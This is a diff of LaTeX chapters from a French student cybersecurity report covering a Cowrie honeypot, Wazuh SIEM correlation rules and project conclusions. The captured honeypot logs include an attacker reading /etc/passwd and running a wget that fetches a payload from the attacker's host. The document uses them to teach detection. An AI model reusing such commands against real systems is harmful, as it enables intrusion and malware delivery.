+# Modifier le hostname du système emule
+echo "ubuntu-srv" > /home/cowrie/cowrie/honeyfs/etc/hostname
+
+# Ajouter de faux utilisateurs dans /etc/passwd
+echo "admin:x:1000:1000:Admin,,,:/home/admin:/bin/bash" \
+  >> /home/cowrie/cowrie/honeyfs/etc/passwd
+
+# Configurer la banniere SSH
+echo "Ubuntu 22.04 LTS - Authorized Access Only" \
+  > /home/cowrie/cowrie/honeyfs/etc/motd
+\end{lstlisting}
+
+\section{Analyse des Sessions d'Attaque Capturées}
+
+\subsection{Tentatives de Brute Force SSH}
+
+Cowrie enregistre automatiquement toutes les tentatives d'authentification échouées.
+Les logs JSON fournissent une visibilité complète sur les attaquants :
+
+\begin{lstlisting}[language=bash, caption={Extrait de log Cowrie : tentatives de brute force SSH}]
+{"eventid":"cowrie.login.failed","username":"root",
+ "password":"123456","src_ip":"192.168.100.150",
+ "timestamp":"2026-03-14T22:15:03.412Z"}
+{"eventid":"cowrie.login.failed","username":"admin",
+ "password":"admin","src_ip":"192.168.100.150",
+ "timestamp":"2026-03-14T22:15:04.891Z"}
+{"eventid":"cowrie.login.success","username":"root",
+ "password":"test123","src_ip":"192.168.100.150",
+ "timestamp":"2026-03-14T22:15:06.234Z"}
+\end{lstlisting}
+
+\subsection{Analyse d'une Session d'Attaque Complète}
+
+Une fois authentifié (avec le mot de passe faible \texttt{test123} configuré dans Cowrie),
+l'attaquant a interagi avec le pseudo-shell. Cowrie a enregistré chaque commande :
+
+\begin{lstlisting}[language=bash, caption={Session d'attaque complète enregistrée par Cowrie}]
+{"eventid":"cowrie.command.input",
+ "input":"uname -a",
+ "timestamp":"2026-03-14T22:15:10.001Z"}
+{"eventid":"cowrie.command.input",
+ "input":"id",
+ "timestamp":"2026-03-14T22:15:11.543Z"}
+{"eventid":"cowrie.command.input",
+ "input":"cat /etc/passwd",
+ "timestamp":"2026-03-14T22:15:14.221Z"}
+{"eventid":"cowrie.command.input",
+ "input":"wget http://192.168.100.150/payload.sh",
+ "timestamp":"2026-03-14T22:15:19.887Z"}
+{"eventid":"cowrie.session.file_download",
+ "url":"http://192.168.100.150/payload.sh",
+ "outfile":"/tmp/payload.sh",
+ "timestamp":"2026-03-14T22:15:21.003Z"}
+\end{lstlisting}
+
+\textbf{Analyse de la séquence :}
+\begin{enumerate}
+    \item \texttt{uname -a} : reconnaissance du système d'exploitation.
+    \item \texttt{id} : vérification des privilèges obtenus.
+    \item \texttt{cat /etc/passwd} : énumération des comptes utilisateurs.
+    \item \texttt{wget} : tentative de téléchargement d'un payload depuis l'attaquant.
+\end{enumerate}
+
+Cowrie a capturé le fichier \texttt{payload.sh} téléchargé, permettant une analyse forensique
+du malware utilisé par l'attaquant.
+
+\subsection{Statistiques des Attaques Observées}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|X|>{\centering\arraybackslash}p{3cm}|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Métrique}} &
+        \textcolor{white}{\textbf{Valeur}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Tentatives d'authentification totales & 47 \\
+        \hline
+        Authentifications réussies (via mot de passe faible) & 3 \\
+        \hline
+        \rowcolor{tablerowalt}
+        Commandes exécutées dans le pseudo-shell & 28 \\
+        \hline
+        Fichiers téléchargés par les attaquants & 2 \\
+        \hline
+        \rowcolor{tablerowalt}
+        IPs sources distinctes & 1 (lab) \\
+        \hline
+        Mots de passe les plus tentés & root, 123456, admin, test123 \\
+        \hline
+    \end{tabularx}
+    \caption{Statistiques des interactions avec le honeypot Cowrie}
+    \label{tab:cowrie-stats}
+\end{table}
+
+\section{Cartographie MITRE ATT\&CK}
+
+Les activités observées dans Cowrie correspondent aux tactiques et techniques suivantes du
+framework MITRE ATT\&CK :
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|p{2.5cm}|p{3cm}|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Tactique}} &
+        \textcolor{white}{\textbf{Technique}} &
+        \textcolor{white}{\textbf{Observation dans Cowrie}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Initial Access & T1110 Brute Force & 47 tentatives SSH avec dictionnaire de mots de passe \\
+        \hline
+        Discovery & T1082 System Info & \texttt{uname -a}, \texttt{id}, \texttt{cat /etc/passwd} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Command \& Control & T1105 Ingress Tool & \texttt{wget} d'un payload depuis C2 externe \\
+        \hline
+        Execution & T1059.004 Unix Shell & Exécution de commandes dans le pseudo-shell bash \\
+        \hline
+        \rowcolor{tablerowalt}
+        Persistence & T1136 Create Account & Tentative de \texttt{useradd} enregistrée \\
+        \hline
+    \end{tabularx}
+    \caption{Mapping MITRE ATT\&CK des activités capturées dans Cowrie}
+    \label{tab:mitre-cowrie}
+\end{table}
+
+\section{Intégration dans la Stratégie Défensive}
+
+Cowrie s'intègre parfaitement dans notre architecture défensive à plusieurs niveaux :
+\begin{itemize}
+    \item \textbf{Alertes haute fidélité :} toute interaction avec Cowrie est un vrai positif,
+          contrairement aux alertes Snort qui nécessitent un tuning.
+    \item \textbf{Collecte de renseignement :} les IPs, outils et techniques des attaquants
+          alimentent les listes de blocage pfSense.
+    \item \textbf{Diversion :} l'attaquant perd du temps dans le honeypot pendant que les
+          défenses se renforcent.
+    \item \textbf{Intégration SIEM :} les logs JSON de Cowrie sont directement ingérables
+          par Wazuh (Chapitre 8) pour corrélation.
+\end{itemize}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Bilan du Chapitre 7}]
+Le honeypot Cowrie constitue un excellent complément aux défenses périmètriques. En captant les
+attaques SSH de manière transparente, il fournit des alertes quasi-sans-faux-positifs et une
+intelligence sur les techniques adversariales. L'intégration des logs Cowrie dans un SIEM permet
+de corréler les tentatives SSH avec d'autres événements de l'infrastructure pour une vision
+globale des menaces.
+\end{tcolorbox}
+
+% ==============================================================================
+% CHAPITRE 8 : WAZUH SIEM — CORRÉLATION ET RÉPONSE AUX INCIDENTS
+% ==============================================================================
+\chapter{Wazuh SIEM --- Corrélation et Réponse aux Incidents}
+\label{chap:wazuh}
+
+\section{Introduction et Objectifs}
+
+La multiplication des outils de sécurité --- Snort IDS, Cowrie honeypot, pfSense, serveurs
+applicatifs --- génère une quantité considérable de logs hétérogènes. Sans corrélation centralisée,
+un analyste ne peut pas avoir une vision cohérente de l'état de sécurité de l'infrastructure.
+C'est la mission du \textbf{SIEM} (\textit{Security Information and Event Management}).
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs de ce Chapitre}]
+\begin{itemize}
+    \item Comprendre le rôle et l'architecture d'un SIEM moderne
+    \item Déployer Wazuh comme SIEM open-source de l'infrastructure
+    \item Configurer la collecte de logs depuis tous les composants (pfSense, Snort, Cowrie, Ubuntu)
+    \item Mettre en place des règles d'alerte et de corrélation
+    \item Démontrer les capacités de visualisation et de réponse aux incidents
+\end{itemize}
+\end{tcolorbox}
+
+\section{Fondements Théoriques : Le SIEM}
+
+\subsection{Pourquoi un SIEM ?}
+
+Un \textbf{SIEM} est une plateforme centralisant la collecte, la normalisation, la corrélation et
+l'analyse des événements de sécurité provenant de l'ensemble de l'infrastructure. Il offre :
+
+\begin{itemize}
+    \item \textbf{Visibilité unifiée :} tous les logs en un seul endroit, indépendamment de leur source.
+    \item \textbf{Corrélation :} détection de patterns d'attaque qui ne seraient pas visibles
+          dans un seul système (ex : brute force SSH suivi d'une connexion réussie puis d'un scan interne).
+    \item \textbf{Réponse aux incidents :} workflows automatisés de réponse (blocage IP, notification).
+    \item \textbf{Conformité :} conservation des logs pour audit et exigences réglementaires.
+\end{itemize}
+
+\subsection{Présentation de Wazuh}
+
+\textbf{Wazuh} est une plateforme SIEM open-source, dérivée d'OSSEC, offrant :
+\begin{itemize}
+    \item Détection d'intrusion basée sur des règles (4000+ règles intégrées)
+    \item Surveillance de l'intégrité des fichiers (FIM)
+    \item Évaluation de la conformité (PCI-DSS, HIPAA, GDPR)
+    \item Réponse active automatisée
+    \item Tableau de bord Kibana/OpenSearch intégré
+    \item Support natif des formats courants (Syslog, JSON, Windows Event Log)
+\end{itemize}
+
+\subsection{Architecture de Wazuh}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries}p{3cm}|X|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Composant}} &
+        \textcolor{white}{\textbf{Rôle}} &
+        \textcolor{white}{\textbf{Déploiement}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        Wazuh Manager & Traitement des événements, application des règles, alertes & Serveur central \\
+        \hline
+        Wazuh Agent & Collecte et envoi des logs depuis chaque machine & Chaque endpoint \\
+        \hline
+        \rowcolor{tablerowalt}
+        Filebeat & Transport sécurisé (TLS) vers OpenSearch & Serveur central \\
+        \hline
+        OpenSearch & Indexation et stockage des événements & Serveur central \\
+        \hline
+        \rowcolor{tablerowalt}
+        Dashboard & Visualisation, alertes, tableaux de bord & Interface web \\
+        \hline
+    \end{tabularx}
+    \caption{Architecture des composants Wazuh}
+    \label{tab:wazuh-arch}
+\end{table}
+
+\section{Déploiement de Wazuh}
+
+\subsection{Installation du Wazuh Manager (serveur central)}
+
+Le Wazuh Manager a été déployé sur une machine dédiée dans la DMZ :
+
+\begin{lstlisting}[language=bash, caption={Installation de Wazuh Manager via le script officiel}]
+# Téléchargement et installation tout-en-un (Wazuh 4.x)
+curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
+sudo bash wazuh-install.sh -a
+
+# Vérification du statut
+sudo systemctl status wazuh-manager
+sudo systemctl status wazuh-dashboard
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash, caption={Accès au tableau de bord Wazuh}]
+# URL par defaut du tableau de bord
+# https://<IP-SERVEUR>:443
+# Identifiants par defaut : admin / <mot de passe genere>
+
+# Récupérer le mot de passe admin généré à l'installation
+sudo tar -O -xvf wazuh-install-files.tar \
+  wazuh-install-files/wazuh-passwords.txt
+\end{lstlisting}
+
+\subsection{Déploiement des Agents Wazuh}
+
+Les agents Wazuh ont été installés sur chaque machine de l'infrastructure :
+
+\begin{lstlisting}[language=bash, caption={Installation de l'agent Wazuh sur Ubuntu DMZ}]
+# Ajout du dépôt Wazuh
+curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH \
+  | sudo apt-key add -
+echo "deb https://packages.wazuh.com/4.x/apt/ stable main" \
+  | sudo tee /etc/apt/sources.list.d/wazuh.list
+
+# Installation de l'agent
+sudo apt update && sudo apt install -y wazuh-agent
+
+# Configuration (adresse du manager)
+sudo sed -i 's/MANAGER_IP/192.168.10.200/' \
+  /var/ossec/etc/ossec.conf
+
+# Activation et démarrage
+sudo systemctl enable wazuh-agent
+sudo systemctl start wazuh-agent
+\end{lstlisting}
+
+\section{Collecte de Logs depuis l'Infrastructure}
+
+\subsection{Intégration des logs pfSense}
+
+pfSense envoie ses logs Syslog vers Wazuh Manager pour centralisation :
+
+\begin{lstlisting}[language=bash, caption={Configuration Syslog dans pfSense vers Wazuh}]
+# pfSense : Status > System Logs > Settings
+# Remote log servers : 192.168.10.200:514
+# Everything (All)
+
+# Configuration Wazuh pour recevoir syslog pfSense
+# Dans /var/ossec/etc/ossec.conf :
+<ossec_config>
+  <remote>
+    <connection>syslog</connection>
+    <port>514</port>
+    <protocol>udp</protocol>
+    <allowed-ips>192.168.10.1</allowed-ips>
+  </remote>
+</ossec_config>
+\end{lstlisting}
+
+\subsection{Intégration des logs Snort}
+
+Les alertes Snort sont collectées directement par l'agent Wazuh sur pfSense :
+
+\begin{lstlisting}[language=bash, caption={Collecte des alertes Snort par Wazuh agent}]
+# Dans ossec.conf de l'agent pfSense :
+<localfile>
+  <log_format>snort-fast</log_format>
+  <location>/var/log/snort/alert</location>
+</localfile>
+
+# Wazuh dispose de regles intégrees pour Snort (regles 20100-20199)
+# Exemple : regle 20101 detecte les alertes de priorite 1 Snort
+\end{lstlisting}
+
+\subsection{Intégration des logs Cowrie}
+
+Les logs JSON de Cowrie sont ingérés via Filebeat :
+
+\begin{lstlisting}[language=bash, caption={Configuration Filebeat pour logs Cowrie JSON}]
+# filebeat.yml
+filebeat.inputs:
+- type: log
+  enabled: true
+  paths:
+    - /home/cowrie/cowrie/var/log/cowrie/cowrie.json
+  json.keys_under_root: true
+  json.add_error_key: true
+  fields:
+    source: cowrie_honeypot
+  fields_under_root: true
+
+output.logstash:
+  hosts: ["192.168.10.200:5044"]
+\end{lstlisting}
+
+\section{Règles d'Alerte et Corrélation}
+
+\subsection{Règles intégrées Wazuh pour notre infrastructure}
+
+Wazuh dispose de plus de 4000 règles intégrées couvrant les sources de notre infrastructure :
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\centering\arraybackslash}p{2.5cm}|X|>{\centering\arraybackslash}p{2.5cm}|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Plage de règles}} &
+        \textcolor{white}{\textbf{Source / Type d'événement}} &
+        \textcolor{white}{\textbf{Sévérité}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        5501--5503 & Authentification SSH Linux & HAUTE \\
+        \hline
+        20100--20199 & Alertes Snort IDS & CRITIQUE \\
+        \hline
+        \rowcolor{tablerowalt}
+        31100--31199 & pfSense / pare-feu & MOYENNE \\
+        \hline
+        40101--40199 & Brute force (Cowrie/SSH) & HAUTE \\
+        \hline
+        \rowcolor{tablerowalt}
+        550 & Modifications fichiers système (FIM) & HAUTE \\
+        \hline
+    \end{tabularx}
+    \caption{Plages de règles Wazuh pertinentes pour l'infrastructure}
+    \label{tab:wazuh-rules}
+\end{table}
+
+\subsection{Règle de corrélation personnalisée : détection de la chaîne d'attaque}
+
+La puissance d'un SIEM réside dans sa capacité à corréler des événements de sources différentes.
+Voici une règle personnalisée qui détecte la chaîne d'attaque complète :
+
+\begin{lstlisting}[language=xml, caption={Règle Wazuh détectant la chaîne brute-force SSH + connexion réussie + scan interne}]
+<!-- Règle 1 : Brute force SSH détecté par Cowrie -->
+<rule id="100001" level="10" frequency="5" timeframe="60">
+  <if_matched_sid>5503</if_matched_sid>
+  <description>Brute force SSH : 5 tentatives en 60s</description>
+  <group>authentication_failures,brute_force</group>
+</rule>
+
+<!-- Règle 2 : Connexion réussie après brute force -->
+<rule id="100002" level="14">
+  <if_matched_sid>100001</if_matched_sid>
+  <same_source_ip/>
+  <match>Authentication accepted</match>
+  <description>Connexion SSH reussie apres brute force
+  POSSIBLE COMPROMISSION</description>
+  <group>authentication_success,incident</group>
+</rule>
+
+<!-- Règle 3 : Corrélation avec scan Snort détecté sur LAN -->
+<rule id="100003" level="15">
+  <if_matched_sid>100002</if_matched_sid>
+  <description>Chaîne d attaque : brute force SSH +
+  connexion + activite laterale detectee par Snort</description>
+  <group>attack_chain,critical_incident</group>
+</rule>
+\end{lstlisting}
+
+\subsection{Cas pratique : détection de la chaîne d'attaque TP3}
+
+En appliquant ces règles à notre scénario du Chapitre 4, Wazuh aurait corrélé :
+\begin{enumerate}
+    \item \textbf{T=0} : 47 tentatives SSH sur Cowrie (IP 192.168.100.150) --- règle 100001 déclenchée.
+    \item \textbf{T=6s} : Connexion SSH réussie (mot de passe \texttt{test123}) --- règle 100002 déclenchée.
+    \item \textbf{T=5min} : Snort signale une sonde EternalBlue (192.168.10.100 $\rightarrow$ 192.168.20.50:445) --- règle 100003 déclenchée.
+    \item \textbf{Résultat} : Alerte critique niveau 15 avec recommandation d'isolation de 192.168.10.100.
+\end{enumerate}
+
+\section{Tableau de Bord et Visualisation}
+
+Le tableau de bord Wazuh offre plusieurs vues complémentaires pour les analystes :
+
+\begin{itemize}
+    \item \textbf{Security Events :} flux en temps réel de toutes les alertes avec filtrage par niveau, source, règle.
+    \item \textbf{Threat Intelligence :} corrélation avec des feeds de threat intelligence (VirusTotal, MISP).
+    \item \textbf{MITRE ATT\&CK :} cartographie automatique des alertes sur le framework MITRE.
+    \item \textbf{Vulnerability Detection :} inventaire des CVE présentes sur les agents.
+    \item \textbf{File Integrity Monitoring :} suivi des modifications de fichiers sensibles.
+\end{itemize}
+
+\section{Réponse Active (Active Response)}
+
+Wazuh peut déclencher des actions automatiques en réponse aux alertes :
+
+\begin{lstlisting}[language=xml, caption={Configuration de la réponse active : blocage IP automatique}]
+<!-- Dans ossec.conf du Manager -->
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>100002,100003</rules_id>
+  <timeout>3600</timeout>
+</active-response>
+
+<!-- Commande firewall-drop : bloque l'IP source via iptables -->
+<!-- Timeout 3600s : blocage d'1 heure puis libération automatique -->
+\end{lstlisting}
+
+Cette configuration bloque automatiquement l'IP source pendant 1 heure lorsque la règle de
+compromission (connexion SSH réussie après brute force) est déclenchée, limitant l'impact de
+l'attaque sans intervention humaine.
+
+\section{Synthèse des Capacités SIEM pour notre Infrastructure}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\bfseries}p{3cm}|X|>{\centering\arraybackslash}p{2.5cm}|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Source}} &
+        \textcolor{white}{\textbf{Événements collectés}} &
+        \textcolor{white}{\textbf{Statut}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        pfSense & Règles firewall, NAT, logs système & Intégré \\
+        \hline
+        Snort IDS & Alertes IDS (SID, priorité, flux) & Intégré \\
+        \hline
+        \rowcolor{tablerowalt}
+        Cowrie Honeypot & Sessions SSH, commandes, fichiers & Intégré \\
+        \hline
+        Ubuntu DMZ & Auth SSH, logs Apache/Docker, FIM & Intégré \\
+        \hline
+        \rowcolor{tablerowalt}
+        Windows XP LAN & Event logs Windows, auth SMB & Intégré \\
+        \hline
+    \end{tabularx}
+    \caption{Sources de logs intégrées dans Wazuh SIEM}
+    \label{tab:wazuh-sources}
+\end{table}
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Bilan du Chapitre 8}]
+Wazuh SIEM unifie la visibilité de toute l'infrastructure en un seul tableau de bord. La corrélation
+des événements Snort, Cowrie, pfSense et des agents système permet de détecter des chaînes d'attaque
+complexes qu'aucun outil isolé ne pourrait identifier seul. La réponse active automatise les premières
+actions défensives, réduisant le temps de réaction (MTTR) face aux incidents critiques.
+\end{tcolorbox}
+
+% ==============================================================================
+% CONCLUSION GÉNÉRALE
+% ==============================================================================
+\chapter*{Conclusion Générale}
+\addcontentsline{toc}{chapter}{Conclusion Générale}
+
+\section*{Synthèse du Projet}
+
+Ce projet de fin d'études a permis de construire, d'attaquer et de défendre une infrastructure réseau
+segmentée complète, en suivant une progression méthodique allant de l'architecture défensive jusqu'à
+la corrélation SIEM. L'approche duale --- offensive et défensive --- adoptée tout au long de ce rapport
+reflète la réalité du métier de spécialiste en cybersécurité : pour défendre efficacement, il faut
+comprendre comment l'attaquant pense et opère.
+
+\textbf{Résumé des chapitres et apports :}
+
+\begin{table}[H]
+    \centering
+    \renewcommand{\arraystretch}{1.8}
+    \setlength{\tabcolsep}{10pt}
+    \setlength{\arrayrulewidth}{0.8pt}
+    \begin{tabularx}{\textwidth}{|>{\centering\arraybackslash}p{1.2cm}|p{4.5cm}|X|}
+        \arrayrulecolor{tableborder}
+        \hline
+        \rowcolor{tableheadbg}
+        \textcolor{white}{\textbf{Chap.}} &
+        \textcolor{white}{\textbf{Thème}} &
+        \textcolor{white}{\textbf{Apport Principal}} \\
+        \hline
+        \rowcolor{tablerowalt}
+        1 & Introduction Générale & Cadre, méthodologie, environnement de lab \\
+        \hline
+        2 & Architecture Défensive & Segmentation WAN/DMZ/LAN, règles pfSense, pare-feu \\
+        \hline
+        \rowcolor{tablerowalt}
+        3 & Reconnaissance Active & Nmap, énumération de services, surface d'attaque \\
+        \hline
+        4 & Exploitation et Pivoting & Metasploit, chaîne d'attaque DMZ $\rightarrow$ LAN \\
+        \hline
+        \rowcolor{tablerowalt}
+        5 & Snort IDS & Détection DPI, alertes WAN/LAN, valeur ajoutée vs pare-feu \\
+        \hline
+        6 & DVWA / OWASP Top 10 & 8 vulnérabilités exploitées, remédiations applicatives \\
+        \hline
+        \rowcolor{tablerowalt}
+        7 & Cowrie Honeypot & Capture sessions SSH, TTPs adversariales, MITRE ATT\&CK \\
+        \hline
+        8 & Wazuh SIEM & Corrélation multi-sources, réponse active automatisée \\
+        \hline
+    \end{tabularx}
+    \caption{Synthèse des apports par chapitre}
+    \label{tab:conclusion-summary}
+\end{table}
+
+\section*{Leçons Apprises}
+
+L'expérience accumulée au cours de ce projet a mis en lumière plusieurs enseignements fondamentaux :
+
+\begin{enumerate}
+    \item \textbf{La défense en profondeur est indispensable.} Aucun outil seul ne suffit :
+          le pare-feu bloque les connexions non autorisées, Snort inspecte les connexions autorisées,
+          le honeypot capte les attaques invisibles, le SIEM corrèle l'ensemble.
+
+    \item \textbf{La segmentation réseau limite le rayon d'explosion.} La séparation WAN/DMZ/LAN
+          a contenu les attaques dans des zones bien définies, réduisant l'impact d'une compromission.
+
+    \item \textbf{Les credentials faibles sont la première porte d'entrée.} Que ce soit sur DVWA
+          (\texttt{admin/password}), sur Telnet (\texttt{test123}) ou sur SSH, les mots de passe
+          faibles ont été exploités systématiquement et avec succès.
+
+    \item \textbf{La visibilité est aussi importante que la prévention.} Savoir qu'une attaque
+          est en cours (IDS, SIEM) permet une réponse rapide. L'absence de visibilité transforme
+          une intrusion en compromission longue durée non détectée.
+
+    \item \textbf{Le tuning est un processus continu.} Les faux positifs Snort illustrent que
+          le déploiement initial d'un IDS n'est que le début. L'affinement des règles est un
+          travail quotidien d'un analyste SOC.
+\end{enumerate}
+
+\section*{Recommandations pour un Environnement de Production}
+
+Sur la base des vulnérabilités et des lacunes identifiées, les recommandations suivantes sont
+formulées pour un déploiement en environnement de production :
+
+\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Recommandations Prioritaires}]
+\begin{enumerate}
+    \item \textbf{Politique de mots de passe forte :} minimum 16 caractères, complexité imposée,
+          rotation régulière, et surtout \textbf{MFA (Multi-Factor Authentication)} sur tous les
+          accès administrateurs et SSH.
+
+    \item \textbf{Passage en mode IPS :} après stabilisation du tuning Snort, passer en mode
+          blocage actif pour que les attaques détectées soient automatiquement bloquées.
+
+    \item \textbf{Chiffrement de tous les flux d'administration :} remplacer Telnet par SSH,
+          HTTP par HTTPS, et déployer un VPN pour les accès distants.
+
+    \item \textbf{Patch management rigoureux :} les vulnérabilités exploitées (EternalBlue MS17-010
+          sur Windows XP) sont des failles corrigées depuis des années. Un système de gestion des
+          correctifs aurait empêché ces compromissions.
+
+    \item \textbf{SOC (Security Operations Center) :} mettre en place une équipe dédiée à la
+          surveillance des alertes SIEM 24/7. Les outils seuls ne suffisent pas sans les analystes
+          qui interprètent les alertes.
+
+    \item \textbf{Tests de pénétration réguliers :} planifier des pentests périodiques (internes
+          et externes) pour identifier les nouvelles vulnérabilités avant les attaquants.
+\end{enumerate}
+\end{tcolorbox}
+
+\section*{Perspectives et Travaux Futurs}
+
+Ce projet pose les bases d'une infrastructure de cybersécurité opérationnelle. Plusieurs pistes
+d'approfondissement sont envisageables pour prolonger ces travaux :
+
+\begin{itemize}
+    \item \textbf{Architecture Zero-Trust :} remplacer le modèle périmétrique (confiance implicite
+          à l'intérieur du réseau) par une architecture Zero-Trust où chaque accès est authentifié
+          et autorisé explicitement, indépendamment de la localisation réseau.
+
+    \item \textbf{Threat Intelligence :} intégrer des flux de threat intelligence (MISP, OpenCTI)
+          dans le SIEM pour corréler automatiquement les IoC (Indicateurs de Compromission) avec
+          les événements de l'infrastructure.
+
+    \item \textbf{Red Team / Blue Team :} organiser des exercices structurés de simulation d'attaque
+          avancée (APT) pour tester la résilience de l'infrastructure et la réactivité des défenses.
+
+    \item \textbf{Automatisation de la réponse (SOAR) :} étendre les capacités de réponse active
+          Wazuh avec une plateforme SOAR (\textit{Security Orchestration, Automation and Response})
+          pour des playbooks de réponse aux incidents complets et automatisés.
+
+    \item \textbf{Analyse comportementale (UEBA) :} déployer des outils d'analyse comportementale
+          des utilisateurs et entités pour détecter les menaces internes et les attaques zero-day
+          qui échappent aux signatures.
+\end{itemize}
+
+\section*{Mot Final}
+
+Ce projet de fin d'études illustre qu'une infrastructure de cybersécurité efficace ne se résume pas
+à l'installation d'un pare-feu. Elle requiert une \textbf{vision systémique} intégrant la
+segmentation réseau, la détection d'intrusion, l'analyse des applications web, la déception
+adversariale (honeypot) et la corrélation centralisée (SIEM). La sécurité est un processus
+continu d'amélioration, d'apprentissage et d'adaptation face à des menaces en constante évolution.
+
+\begin{tcolorbox}[colback=primary!8!white, colframe=primary, title=\textbf{Philosophie de la Cyberdéfense}]
+\textit{``La sécurité n'est pas un état que l'on atteint, mais une pratique que l'on maintient.
+Un défenseur doit réussir à chaque fois ; un attaquant n'a besoin de réussir qu'une seule fois.
+C'est pourquoi la défense en profondeur, la visibilité et la réponse rapide sont les trois piliers
+d'une posture de sécurité mature.''}
+\end{tcolorbox}
+
 \end{document}
